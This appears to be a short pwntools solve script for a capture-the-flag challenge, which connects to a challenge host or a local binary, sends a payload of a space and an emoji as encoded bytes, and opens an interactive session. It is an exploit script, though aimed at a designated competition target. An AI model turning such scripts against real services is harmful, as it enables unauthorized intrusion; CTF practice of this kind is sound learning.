from pwn import *

if args.REMOTE:
    p = remote("chall.pwnoh.io", 13370)
else:
    p = process("./chal/run")

payload = " 😠".encode()
p.sendline(payload)

p.interactive()